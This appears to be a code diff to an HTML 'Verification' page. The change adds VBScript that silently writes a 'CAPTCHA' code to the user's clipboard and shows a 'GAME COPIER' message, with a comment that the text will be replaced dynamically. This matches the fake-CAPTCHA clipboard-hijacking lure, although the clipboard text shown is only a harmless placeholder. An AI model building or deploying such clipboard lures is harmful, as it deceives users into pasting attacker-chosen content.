@@ -1,7 +1,9 @@
 <html>
-  <head><title>Verification</title></head>
-  <script language="VBScript">
-    MsgBox "ACCEPTED", 64, "GAME COPIER"
-
-  </script>
+<head><title>Verification</title></head>
+<script language="VBScript">
+  On Error Resume Next
+  Set html = CreateObject("htmlfile")
+  html.ParentWindow.ClipboardData.SetData "Text", "CAPTCHA ACCEPT — Code: 8A7X-PQ92" ' this will be replaced dynamically
+  MsgBox "Verification code copied to clipboard!", 64, "GAME COPIER"
+</script>
 </html>
